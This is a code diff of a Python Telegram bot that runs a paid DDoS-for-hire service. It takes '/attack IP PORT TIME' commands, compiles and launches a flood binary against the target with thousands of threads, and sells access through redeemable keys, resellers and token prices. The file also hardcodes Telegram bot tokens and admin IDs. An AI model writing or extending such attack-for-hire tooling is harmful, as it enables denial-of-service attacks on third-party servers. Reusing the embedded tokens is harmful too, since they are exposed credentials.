@@ -1,158 +1,93 @@
-#!/usr/bin/env python3
-import os
 import time
 import threading
 import json
+import os
 import subprocess
 import requests
 import random
 import string
-from datetime import datetime
 
-# ==================== BOT 1 CONFIG ====================
-TOKEN1 = "8479899015:AAFhCQEmKSdNhXzLPdz_p4ZXcaJvPIMBtdU"
-ADMIN1 = [6548871396, 8749555677]
-CONTACT1 = "@TG_ROLEX"
+TOKEN = "8749555677:AAGH3CzScRKE8mBTLxRapV0zrxdjn-NEul8"
+ADMIN_ID = 6548871396
+last_id = 0
 
-# ==================== BOT 2 CONFIG ====================
-TOKEN2 = "8749555677:AAGH3CzScRKE8mBTLxRapV0zrxdjn-NEul8"
-ADMIN2 = [6548871396]
-CONTACT2 = "@TG_DEVILOP"
-
-# ==================== SHARED ====================
-users1 = {}
-users2 = {}
-groups1 = {}
-groups2 = {}
-keys1 = {}
-keys2 = {}
-resellers1 = {}
-resellers2 = {}
-blocked_keys1 = {}
-blocked_keys2 = {}
+users = {}
+groups = {}
+keys = {}
+resellers = {}
+blocked_keys = {}
 is_attack = False
 current_target = ""
 slot_lock = threading.Lock()
 current_slots = 0
 MAX_SLOTS = 50
 attack_threads = 2000
-attack_time = 180
+attack_time = 180  # Max 180 seconds
+VIDEO_FILE_ID = None
+RESELLER_PREFIX = "KING"
+
 cooldown_seconds = 100
-user_last_attack_1 = {}
-user_last_attack_2 = {}
+user_last_attack = {}
 attack_daily_limit = 35
-user_attack_count_1 = {}
-user_attack_count_2 = {}
+user_attack_count = {}
+is_locked = False
+
 server_status = "ACTIVE"
 bandwidth = "200 GBPS"
-last_id1 = 0
-last_id2 = 0
+attack_methods = ["1", "2", "3", "4", "5", "6", "7", "8"]
 
 KEY_PRICES = {
     "1h": 0, "12h": 2, "1d": 4, "3d": 8, "7d": 15, "14d": 30, "30d": 50
 }
 
-# ==================== FAST RESPONSE FLAGS ====================
-waiting_attack1 = {}
-waiting_attack2 = {}
-waiting_redeem1 = {}
-waiting_redeem2 = {}
-waiting_adduser1 = {}
-waiting_adduser2 = {}
-waiting_removeuser1 = {}
-waiting_removeuser2 = {}
-waiting_addgroup1 = {}
-waiting_addgroup2 = {}
-waiting_removegroup1 = {}
-waiting_removegroup2 = {}
-waiting_addreseller1 = {}
-waiting_addreseller2 = {}
-waiting_removereseller1 = {}
-waiting_removereseller2 = {}
-waiting_setthreads1 = {}
-waiting_setthreads2 = {}
-waiting_settime1 = {}
-waiting_settime2 = {}
-waiting_setslots1 = {}
-waiting_setslots2 = {}
-waiting_setcooldown1 = {}
-waiting_setcooldown2 = {}
-waiting_setdaily1 = {}
-waiting_setdaily2 = {}
-waiting_gen1 = {}
-waiting_gen2 = {}
-waiting_blockkey1 = {}
-waiting_blockkey2 = {}
-waiting_unblockkey1 = {}
-waiting_unblockkey2 = {}
-waiting_broadcast1 = {}
-waiting_broadcast2 = {}
-waiting_unlimited1 = {}
-waiting_unlimited2 = {}
-waiting_limited1 = {}
-waiting_limited2 = {}
+def send_msg(chat_id, text):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        data = {"chat_id": chat_id, "text": text}
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
 
-# ==================== HELPERS ====================
-def compile_binary():
-    if os.path.exists("./attack"):
-        return True
-    if os.path.exists("./attack.c"):
-        os.system("gcc -o attack attack.c -lpthread 2>/dev/null")
-        os.system("chmod +x attack 2>/dev/null")
-        return os.path.exists("./attack")
-    return False
+def send_video(chat_id, video_id, caption):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
+        data = {"chat_id": chat_id, "video": video_id, "caption": caption}
+        requests.post(url, data=data, timeout=10)
+    except:
+        pass
+
+def send_inline_buttons(chat_id, text, buttons):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        payload = {"chat_id": chat_id, "text": text, "reply_markup": {"inline_keyboard": buttons}}
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def edit_msg(chat_id, msg_id, text):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
+        data = {"chat_id": chat_id, "message_id": msg_id, "text": text}
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
+
+def del_msg(chat_id, msg_id):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
+        data = {"chat_id": chat_id, "message_id": msg_id}
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
 
 def run_attack(ip, port, sec):
     try:
-        if not os.path.exists("./attack"):
-            return False
-        cmd = ["./attack", ip, str(port), str(sec), str(attack_threads)]
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(["./bgmi", ip, str(port), str(sec), str(attack_threads)], 
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(sec)
         return True
     except:
         return False
-
-def send_msg(token, chat_id, text):
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        data = {"chat_id": chat_id, "text": text}
-        requests.post(url, data=data, timeout=2)
-    except:
-        pass
-
-def send_msg_and_get_id(token, chat_id, text):
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        data = {"chat_id": chat_id, "text": text}
-        r = requests.post(url, data=data, timeout=2)
-        return r.json().get("result", {}).get("message_id")
-    except:
-        return None
-
-def edit_msg(token, chat_id, msg_id, text):
-    try:
-        url = f"https://api.telegram.org/bot{token}/editMessageText"
-        data = {"chat_id": chat_id, "message_id": msg_id, "text": text}
-        requests.post(url, data=data, timeout=2)
-    except:
-        pass
-
-def del_msg(token, chat_id, msg_id):
-    try:
-        url = f"https://api.telegram.org/bot{token}/deleteMessage"
-        data = {"chat_id": chat_id, "message_id": msg_id}
-        requests.post(url, data=data, timeout=2)
-    except:
-        pass
-
-def send_inline_buttons(token, chat_id, text, buttons):
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {"chat_id": chat_id, "text": text, "reply_markup": {"inline_keyboard": buttons}}
-        requests.post(url, json=payload, timeout=2)
-    except:
-        pass
 
 def get_slots():
     global current_slots
@@ -173,328 +108,163 @@ def remove_slot():
             current_slots -= 1
     return current_slots
 
-def get_expiry(users, uid):
+def save():
+    with open('data.json', 'w') as f:
+        json.dump({
+            'users': users, 'groups': groups, 'video_id': VIDEO_FILE_ID,
+            'keys': keys, 'resellers': resellers, 'blocked_keys': blocked_keys,
+            'max_slots': MAX_SLOTS, 'cooldown': cooldown_seconds, 'daily_limit': attack_daily_limit
+        }, f)
+
+def load():
+    global users, groups, VIDEO_FILE_ID, keys, resellers, blocked_keys, MAX_SLOTS, cooldown_seconds, attack_daily_limit
+    try:
+        with open('data.json', 'r') as f:
+            d = json.load(f)
+            users.update(d.get('users', {}))
+            groups.update(d.get('groups', {}))
+            VIDEO_FILE_ID = d.get('video_id', None)
+            keys.update(d.get('keys', {}))
+            resellers.update(d.get('resellers', {}))
+            blocked_keys.update(d.get('blocked_keys', {}))
+            MAX_SLOTS = d.get('max_slots', 50)
+            cooldown_seconds = d.get('cooldown', 100)
+            attack_daily_limit = d.get('daily_limit', 35)
+    except:
+        pass
+
+def is_user(uid):
+    if uid == ADMIN_ID:
+        return True
+    return str(uid) in users and time.time() < users[str(uid)]
+
+def is_reseller(uid):
+    return str(uid) in resellers
+
+def get_user_expiry(uid):
     if str(uid) in users:
         remaining = users[str(uid)] - time.time()
         if remaining <= 0:
             return "Expired"
         days = int(remaining // 86400)
         hours = int((remaining % 86400) // 3600)
+        minutes = int((remaining % 3600) // 60)
+        
         if days > 0:
-            return f"{days}d {hours}h"
-        return f"{hours}h"
+            if hours > 0:
+                return f"{days}d {hours}h"
+            elif minutes > 0:
+                return f"{days}d {minutes}m"
+            return f"{days}d"
+        elif hours > 0:
+            if minutes > 0:
+                return f"{hours}h {minutes}m"
+            return f"{hours}h"
+        else:
+            return f"{minutes}m"
     return None
 
-def generate_key(prefix, days=0, hours=0):
-    return f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
+def is_group(gid):
+    return str(gid) in groups and time.time() < groups[str(gid)]
 
-def save_users1():
-    with open('users1.json', 'w') as f:
-        json.dump(users1, f)
+def add_user(uid, days, hours=0):
+    users[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
+    save()
 
-def load_users1():
-    global users1
-    try:
-        with open('users1.json', 'r') as f:
-            users1 = json.load(f)
-    except:
-        users1 = {}
+def remove_user(uid):
+    if str(uid) in users:
+        del users[str(uid)]
+        save()
 
-def save_users2():
-    with open('users2.json', 'w') as f:
-        json.dump(users2, f)
+def add_group(gid, days):
+    groups[str(gid)] = time.time() + days * 86400
+    save()
 
-def load_users2():
-    global users2
-    try:
-        with open('users2.json', 'r') as f:
-            users2 = json.load(f)
-    except:
-        users2 = {}
+def remove_group(gid):
+    if str(gid) in groups:
+        del groups[str(gid)]
+        save()
 
-def save_keys1():
-    with open('keys1.json', 'w') as f:
-        json.dump(keys1, f)
+def add_reseller(uid, tokens, is_unlimited=False):
+    resellers[str(uid)] = {
+        'tokens': tokens if not is_unlimited else -1,
+        'total_earned': 0,
+        'created_at': time.time(),
+        'keys_generated': [],
+        'blocked_keys': [],
+        'unlimited': is_unlimited
+    }
+    save()
 
-def load_keys1():
-    global keys1
-    try:
-        with open('keys1.json', 'r') as f:
-            keys1 = json.load(f)
-    except:
-        keys1 = {}
+def remove_reseller(uid):
+    if str(uid) in resellers:
+        del resellers[str(uid)]
+        save()
 
-def save_keys2():
-    with open('keys2.json', 'w') as f:
-        json.dump(keys2, f)
-
-def load_keys2():
-    global keys2
-    try:
-        with open('keys2.json', 'r') as f:
-            keys2 = json.load(f)
-    except:
-        keys2 = {}
-
-def save_groups1():
-    with open('groups1.json', 'w') as f:
-        json.dump(groups1, f)
-
-def load_groups1():
-    global groups1
-    try:
-        with open('groups1.json', 'r') as f:
-            groups1 = json.load(f)
-    except:
-        groups1 = {}
-
-def save_groups2():
-    with open('groups2.json', 'w') as f:
-        json.dump(groups2, f)
-
-def load_groups2():
-    global groups2
-    try:
-        with open('groups2.json', 'r') as f:
-            groups2 = json.load(f)
-    except:
-        groups2 = {}
-
-def save_resellers1():
-    with open('resellers1.json', 'w') as f:
-        json.dump(resellers1, f)
-
-def load_resellers1():
-    global resellers1
-    try:
-        with open('resellers1.json', 'r') as f:
-            resellers1 = json.load(f)
-    except:
-        resellers1 = {}
-
-def save_resellers2():
-    with open('resellers2.json', 'w') as f:
-        json.dump(resellers2, f)
-
-def load_resellers2():
-    global resellers2
-    try:
-        with open('resellers2.json', 'r') as f:
-            resellers2 = json.load(f)
-    except:
-        resellers2 = {}
-
-def save_attack_count1():
-    with open('attack_count1.json', 'w') as f:
-        json.dump({'count': user_attack_count_1, 'last': user_last_attack_1}, f)
-
-def load_attack_count1():
-    global user_attack_count_1, user_last_attack_1
-    try:
-        with open('attack_count1.json', 'r') as f:
-            d = json.load(f)
-            user_attack_count_1 = d.get('count', {})
-            user_last_attack_1 = d.get('last', {})
-    except:
-        pass
-
-def save_attack_count2():
-    with open('attack_count2.json', 'w') as f:
-        json.dump({'count': user_attack_count_2, 'last': user_last_attack_2}, f)
-
-def load_attack_count2():
-    global user_attack_count_2, user_last_attack_2
-    try:
-        with open('attack_count2.json', 'r') as f:
-            d = json.load(f)
-            user_attack_count_2 = d.get('count', {})
-            user_last_attack_2 = d.get('last', {})
-    except:
-        pass
-
-def can_attack1(uid):
-    today = time.strftime("%Y-%m-%d")
-    key = f"{uid}_{today}"
-    if key not in user_attack_count_1:
-        user_attack_count_1[key] = 0
-    if user_attack_count_1[key] >= attack_daily_limit:
-        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
-    if uid not in ADMIN1:
-        if uid in user_last_attack_1:
-            last = user_last_attack_1[uid]
-            remaining = cooldown_seconds - (time.time() - last)
-            if remaining > 0:
-                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
-    return True, "OK"
-
-def add_attack_count1(uid):
-    today = time.strftime("%Y-%m-%d")
-    key = f"{uid}_{today}"
-    user_attack_count_1[key] = user_attack_count_1.get(key, 0) + 1
-    user_last_attack_1[uid] = time.time()
-    save_attack_count1()
-
-def can_attack2(uid):
-    today = time.strftime("%Y-%m-%d")
-    key = f"{uid}_{today}"
-    if key not in user_attack_count_2:
-        user_attack_count_2[key] = 0
-    if user_attack_count_2[key] >= attack_daily_limit:
-        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
-    if uid not in ADMIN2:
-        if uid in user_last_attack_2:
-            last = user_last_attack_2[uid]
-            remaining = cooldown_seconds - (time.time() - last)
-            if remaining > 0:
-                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
-    return True, "OK"
-
-def add_attack_count2(uid):
-    today = time.strftime("%Y-%m-%d")
-    key = f"{uid}_{today}"
-    user_attack_count_2[key] = user_attack_count_2.get(key, 0) + 1
-    user_last_attack_2[uid] = time.time()
-    save_attack_count2()
-
-def redeem_key1(uid, key):
-    if key not in keys1:
-        return False, "❌ Invalid Key!"
-    if keys1[key].get('used', False):
-        return False, "❌ Key Already Used!"
-    if keys1[key].get('blocked', False):
-        return False, "❌ Key is Blocked!"
-    
-    days = keys1[key].get('days', 0)
-    hours = keys1[key].get('hours', 0)
-    keys1[key]['used'] = True
-    keys1[key]['used_by'] = str(uid)
-    keys1[key]['used_at'] = time.time()
-    users1[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
-    save_keys1()
-    save_users1()
-    plan = f"{days} Days" if days > 0 else f"{hours} Hours"
-    return True, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-✅ KEY REDEEMED SUCCESSFULLY!
-━━━━━━━━━━━━━━━━━━━━━━━━
-Plan: {plan}
-Daily Limit: {attack_daily_limit} attacks
-Cooldown: {cooldown_seconds}s
-
-Your account is now ACTIVE!
-━━━━━━━━━━━━━━━━━━━━━━━━
-"""
-
-def redeem_key2(uid, key):
-    if key not in keys2:
-        return False, "❌ Invalid Key!"
-    if keys2[key].get('used', False):
-        return False, "❌ Key Already Used!"
-    if keys2[key].get('blocked', False):
-        return False, "❌ Key is Blocked!"
-    
-    days = keys2[key].get('days', 0)
-    hours = keys2[key].get('hours', 0)
-    keys2[key]['used'] = True
-    keys2[key]['used_by'] = str(uid)
-    keys2[key]['used_at'] = time.time()
-    users2[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
-    save_keys2()
-    save_users2()
-    plan = f"{days} Days" if days > 0 else f"{hours} Hours"
-    return True, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-✅ KEY REDEEMED SUCCESSFULLY!
-━━━━━━━━━━━━━━━━━━━━━━━━
-Plan: {plan}
-Daily Limit: {attack_daily_limit} attacks
-Cooldown: {cooldown_seconds}s
-
-Your account is now ACTIVE!
-━━━━━━━━━━━━━━━━━━━━━━━━
-"""
-
-def add_reseller1(uid, tokens, is_unlimited=False):
-    resellers1[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'created_at': time.time(), 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
-    save_resellers1()
-
-def remove_reseller1(uid):
-    if str(uid) in resellers1:
-        del resellers1[str(uid)]
-        save_resellers1()
-
-def get_reseller_tokens1(uid):
-    if str(uid) in resellers1:
-        if resellers1[str(uid)].get('unlimited', False):
+def get_reseller_tokens(uid):
+    if str(uid) in resellers:
+        if resellers[str(uid)].get('unlimited', False):
             return "∞"
-        return resellers1[str(uid)].get('tokens', 0)
+        return resellers[str(uid)].get('tokens', 0)
     return 0
 
-def deduct_reseller_tokens1(uid, amount):
-    if str(uid) in resellers1:
-        if resellers1[str(uid)].get('unlimited', False):
+def deduct_reseller_tokens(uid, amount):
+    if str(uid) in resellers:
+        if resellers[str(uid)].get('unlimited', False):
             return True
-        if resellers1[str(uid)].get('tokens', 0) >= amount:
-            resellers1[str(uid)]['tokens'] -= amount
-            resellers1[str(uid)]['total_earned'] += amount
-            save_resellers1()
+        if resellers[str(uid)].get('tokens', 0) >= amount:
+            resellers[str(uid)]['tokens'] -= amount
+            resellers[str(uid)]['total_earned'] += amount
+            save()
             return True
     return False
 
-def add_reseller_key_record1(uid, key):
-    if str(uid) in resellers1:
-        if 'keys_generated' not in resellers1[str(uid)]:
-            resellers1[str(uid)]['keys_generated'] = []
-        resellers1[str(uid)]['keys_generated'].append(key)
-        save_resellers1()
+def add_reseller_key_record(uid, key):
+    if str(uid) in resellers:
+        if 'keys_generated' not in resellers[str(uid)]:
+            resellers[str(uid)]['keys_generated'] = []
+        resellers[str(uid)]['keys_generated'].append(key)
+        save()
 
-def add_reseller2(uid, tokens, is_unlimited=False):
-    resellers2[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'created_at': time.time(), 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
-    save_resellers2()
+def remove_reseller_key_record(uid, key):
+    if str(uid) in resellers and 'keys_generated' in resellers[str(uid)]:
+        if key in resellers[str(uid)]['keys_generated']:
+            resellers[str(uid)]['keys_generated'].remove(key)
+            save()
 
-def remove_reseller2(uid):
-    if str(uid) in resellers2:
-        del resellers2[str(uid)]
-        save_resellers2()
+def get_reseller_keys(uid):
+    return resellers[str(uid)]['keys_generated'] if str(uid) in resellers and 'keys_generated' in resellers[str(uid)] else []
 
-def get_reseller_tokens2(uid):
-    if str(uid) in resellers2:
-        if resellers2[str(uid)].get('unlimited', False):
-            return "∞"
-        return resellers2[str(uid)].get('tokens', 0)
-    return 0
+def add_blocked_key(uid, key, reason="blocked"):
+    if str(uid) in resellers:
+        if 'blocked_keys' not in resellers[str(uid)]:
+            resellers[str(uid)]['blocked_keys'] = []
+        resellers[str(uid)]['blocked_keys'].append(key)
+    blocked_keys[key] = {'blocked_by': str(uid), 'reason': reason, 'blocked_at': time.time()}
+    if key in keys:
+        keys[key]['blocked'] = True
+    save()
 
-def deduct_reseller_tokens2(uid, amount):
-    if str(uid) in resellers2:
-        if resellers2[str(uid)].get('unlimited', False):
-            return True
-        if resellers2[str(uid)].get('tokens', 0) >= amount:
-            resellers2[str(uid)]['tokens'] -= amount
-            resellers2[str(uid)]['total_earned'] += amount
-            save_resellers2()
-            return True
+def remove_blocked_key(key):
+    if key in blocked_keys:
+        blocker = blocked_keys[key]['blocked_by']
+        if blocker in resellers and 'blocked_keys' in resellers[blocker]:
+            if key in resellers[blocker]['blocked_keys']:
+                resellers[blocker]['blocked_keys'].remove(key)
+        del blocked_keys[key]
+        if key in keys:
+            keys[key]['blocked'] = False
+        save()
+        return True
     return False
 
-def add_reseller_key_record2(uid, key):
-    if str(uid) in resellers2:
-        if 'keys_generated' not in resellers2[str(uid)]:
-            resellers2[str(uid)]['keys_generated'] = []
-        resellers2[str(uid)]['keys_generated'].append(key)
-        save_resellers2()
+def is_key_blocked(key):
+    return key in blocked_keys
 
-def generate_admin_key1(prefix, days, hours):
-    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    keys1[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': "admin", 'blocked': False}
-    save_keys1()
-    return key
+def get_reseller_blocked_keys(uid):
+    return resellers[str(uid)]['blocked_keys'] if str(uid) in resellers and 'blocked_keys' in resellers[str(uid)] else []
 
-def generate_admin_key2(prefix, days, hours):
-    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    keys2[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': "admin", 'blocked': False}
-    save_keys2()
-    return key
-
-def generate_reseller_key1(uid, duration_str):
+def generate_reseller_key(reseller_id, duration_str):
     days, hours, price = 0, 0, 0
     if duration_str == "1h": hours, price = 1, 0
     elif duration_str == "12h": hours, price = 12, 2
@@ -504,89 +274,102 @@ def generate_reseller_key1(uid, duration_str):
     elif duration_str == "14d": days, price = 14, 30
     elif duration_str == "30d": days, price = 30, 50
     
-    if price > 0 and not deduct_reseller_tokens1(uid, price):
+    if price > 0 and not deduct_reseller_tokens(reseller_id, price):
         return None, f"❌ Insufficient tokens! Need {price} tokens"
     
-    key = f"KING-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    keys1[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': str(uid), 'blocked': False}
-    add_reseller_key_record1(uid, key)
-    save_keys1()
+    key = f"{RESELLER_PREFIX}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
+    keys[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'used_at': None, 'created_at': time.time(), 'created_by': str(reseller_id), 'blocked': False}
+    add_reseller_key_record(reseller_id, key)
+    save()
     return key, None
 
-def generate_reseller_key2(uid, duration_str):
-    days, hours, price = 0, 0, 0
-    if duration_str == "1h": hours, price = 1, 0
-    elif duration_str == "12h": hours, price = 12, 2
-    elif duration_str == "1d": days, price = 1, 4
-    elif duration_str == "3d": days, price = 3, 8
-    elif duration_str == "7d": days, price = 7, 15
-    elif duration_str == "14d": days, price = 14, 30
-    elif duration_str == "30d": days, price = 30, 50
-    
-    if price > 0 and not deduct_reseller_tokens2(uid, price):
-        return None, f"❌ Insufficient tokens! Need {price} tokens"
-    
-    key = f"KING-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    keys2[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': str(uid), 'blocked': False}
-    add_reseller_key_record2(uid, key)
-    save_keys2()
-    return key, None
+def generate_admin_key(prefix, days=0, hours=0):
+    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
+    keys[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'used_at': None, 'created_at': time.time(), 'created_by': "admin", 'blocked': False}
+    save()
+    return key
 
-def delete_key1(key):
-    if key in keys1:
-        creator = keys1[key].get('created_by')
+def delete_key(key):
+    if key in keys:
+        creator = keys[key].get('created_by')
         if creator and creator != "admin":
-            remove_reseller_key_record1(creator, key)
-        del keys1[key]
-        save_keys1()
+            remove_reseller_key_record(creator, key)
+        del keys[key]
+        save()
         return True
     return False
 
-def delete_key2(key):
-    if key in keys2:
-        creator = keys2[key].get('created_by')
-        if creator and creator != "admin":
-            remove_reseller_key_record2(creator, key)
-        del keys2[key]
-        save_keys2()
-        return True
-    return False
+def can_attack(uid):
+    # Daily limit check
+    today = time.strftime("%Y-%m-%d")
+    key = f"{uid}_{today}"
+    if key not in user_attack_count:
+        user_attack_count[key] = 0
+    if user_attack_count[key] >= attack_daily_limit:
+        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
+    
+    # Cooldown check for non-admin
+    if uid != ADMIN_ID:
+        if uid in user_last_attack:
+            last = user_last_attack[uid]
+            remaining = cooldown_seconds - (time.time() - last)
+            if remaining > 0:
+                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
+    return True, "OK"
 
-def add_blocked_key1(uid, key):
-    if str(uid) in resellers1:
-        if 'blocked_keys' not in resellers1[str(uid)]:
-            resellers1[str(uid)]['blocked_keys'] = []
-        resellers1[str(uid)]['blocked_keys'].append(key)
-    blocked_keys1[key] = True
-    if key in keys1:
-        keys1[key]['blocked'] = True
-    save_keys1()
+def add_attack_count(uid):
+    today = time.strftime("%Y-%m-%d")
+    key = f"{uid}_{today}"
+    user_attack_count[key] = user_attack_count.get(key, 0) + 1
+    user_last_attack[uid] = time.time()
+    save()
 
-def remove_blocked_key1(key):
-    if key in blocked_keys1:
-        del blocked_keys1[key]
-    if key in keys1:
-        keys1[key]['blocked'] = False
-    save_keys1()
+def redeem_key(user_id, key):
+    if key not in keys:
+        return False, "❌ Invalid Key!"
+    if keys[key]['used']:
+        return False, "❌ Key Already Used!"
+    if keys[key].get('blocked', False) or is_key_blocked(key):
+        return False, "❌ Key is Blocked!"
+    
+    days, hours = keys[key]['days'], keys[key]['hours']
+    keys[key]['used'] = True
+    keys[key]['used_by'] = str(user_id)
+    keys[key]['used_at'] = time.time()
+    users[str(user_id)] = time.time() + (days * 86400) + (hours * 3600)
+    save()
+    
+    if days > 0:
+        plan = f"{days} Days"
+    else:
+        plan = f"{hours} Hours"
+    
+    return True, f"""
+✅ KEY REDEEMED!
 
-def add_blocked_key2(uid, key):
-    if str(uid) in resellers2:
-        if 'blocked_keys' not in resellers2[str(uid)]:
-            resellers2[str(uid)]['blocked_keys'] = []
-        resellers2[str(uid)]['blocked_keys'].append(key)
-    blocked_keys2[key] = True
-    if key in keys2:
-        keys2[key]['blocked'] = True
-    save_keys2()
+Plan: {plan}
+Daily Limit: {attack_daily_limit} attacks
+Cooldown: {cooldown_seconds}s
 
-def remove_blocked_key2(key):
-    if key in blocked_keys2:
-        del blocked_keys2[key]
-    if key in keys2:
-        keys2[key]['blocked'] = False
-    save_keys2()
+Your account is now ACTIVE!
+"""
 
-def run_progress(token, chat_id, msg_id, ip, port, sec, method):
+def check_binary():
+    if not os.path.exists("./bgmi"):
+        os.system("clang -o bgmi bgmi.c -pthread -O3 2>/dev/null")
+        os.system("chmod +x bgmi")
+    return os.path.exists("./bgmi")
+
+def send_msg_and_get_id(chat_id, text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {"chat_id": chat_id, "text": text}
+    r = requests.post(url, data=data, timeout=5)
+    try:
+        return r.json().get("result", {}).get("message_id")
+    except:
+        return None
+
+def run_progress(chat_id, msg_id, ip, port, sec, method_num):
     global is_attack
     for i in range(sec):
         if not is_attack:
@@ -595,7 +378,7 @@ def run_progress(token, chat_id, msg_id, ip, port, sec, method):
         bar = "█" * p + "░" * (20 - p)
         percent = int((i+1) / sec * 100)
         try:
-            edit_msg(token, chat_id, msg_id, f"""
+            edit_msg(chat_id, msg_id, f"""
 ⚡ ATTACK IN PROGRESS ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━
 🎯 Target: {ip}
@@ -604,20 +387,22 @@ def run_progress(token, chat_id, msg_id, ip, port, sec, method):
 ⏱️ Left: {sec-(i+1)}s
 🖥 SERVER    : {server_status}
 🚀 BANDWIDTH : {bandwidth}
+⚙️ METHODS   : {method_num}/8
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
         except:
             pass
         time.sleep(1)
     
+    # Attack finished
     if is_attack:
         is_attack = False
         remove_slot()
         try:
-            del_msg(token, chat_id, msg_id)
+            del_msg(chat_id, msg_id)
         except:
             pass
-        send_msg(token, chat_id, f"""
+        send_msg(chat_id, f"""
 ✅ ATTACK COMPLETE ✅
 ━━━━━━━━━━━━━━━━━━━━━━
 🎯 Target: {ip}
@@ -629,232 +414,31 @@ def run_progress(token, chat_id, msg_id, ip, port, sec, method):
 🎮 Free Slots: {get_slots()}/{MAX_SLOTS}
 ━━━━━━━━━━━━━━━━━━━━━━
 """)
+        # Run actual attack in background
         threading.Thread(target=run_attack, args=(ip, port, sec)).start()
 
-# ==================== BOT 1 FUNCTIONS ====================
-def is_user1(uid):
-    if uid in ADMIN1:
-        return True
-    return str(uid) in users1 and time.time() < users1[str(uid)]
-
-def add_user1(uid, days):
-    users1[str(uid)] = time.time() + (days * 86400)
-    save_users1()
-
-def remove_user1(uid):
-    if str(uid) in users1:
-        del users1[str(uid)]
-        save_users1()
-
-def is_group1(gid):
-    return str(gid) in groups1 and time.time() < groups1[str(gid)]
-
-def add_group1(gid, days):
-    groups1[str(gid)] = time.time() + (days * 86400)
-    save_groups1()
-
-def remove_group1(gid):
-    if str(gid) in groups1:
-        del groups1[str(gid)]
-        save_groups1()
-
-def is_reseller1(uid):
-    return str(uid) in resellers1
-
-def get_reseller_keys1(uid):
-    return resellers1[str(uid)].get('keys_generated', []) if str(uid) in resellers1 else []
-
-def get_reseller_blocked_keys1(uid):
-    return resellers1[str(uid)].get('blocked_keys', []) if str(uid) in resellers1 else []
-
-def handle_start1(chat_id, uid):
-    if not is_user1(uid):
-        send_msg(TOKEN1, chat_id, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-   ⚡ DDOS BOT STARTED ⚡ 
-━━━━━━━━━━━━━━━━━━━━━━━━
-❌ ACCESS DENIED!            
-You Are Not Approved!          
-━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 /redeem KEY - Get Access
-━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 BUY ACCESS: {CONTACT1}
-━━━━━━━━━━━━━━━━━━━━━━━━
-""")
+def handle_video(chat_id, uid, video_id):
+    global VIDEO_FILE_ID
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
         return
-    
-    if uid in ADMIN1:
-        send_msg(TOKEN1, chat_id, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-     ⚡ DDOS BOT STARTED ⚡ 
-━━━━━━━━━━━━━━━━━━━━━━━━
-        👑 WELCOME ADMIN
-━━━━━━━━━━━━━━━━━━━━━━━━
-📌 USER COMMANDS:                      
-/attack IP PORT TIME - Start attack
-/stop - Stop attack
-/id - Your ID
-/redeem KEY - Redeem access key
-/help - This menu
-/rules - Bot rules
-━━━━━━━━━━━━━━━━━━━━━━━━
-👑 ADMIN COMMANDS:
-/adduser ID DAYS - Add user
-/removeuser ID - Remove user
-/addreseller ID TOKENS - Add reseller
-/removereseller ID - Remove reseller
-/setthreads NUM - Set threads
-/settime SEC - Set max time
-/setslots NUM - Set max slots
-/setcooldown SEC - Set cooldown
-/setdaily LIMIT - Set daily limit
-/gen PREFIX DURATION - Generate key
-/keys - List all keys
-/deletekeys - Delete all keys
-/blockkey KEY - Block key
-/unblockkey KEY - Unblock key
-/broadcast MSG - Broadcast message
-/lock - Lock bot
-/unlock - Unlock bot
-/unlimited ID - Make reseller unlimited
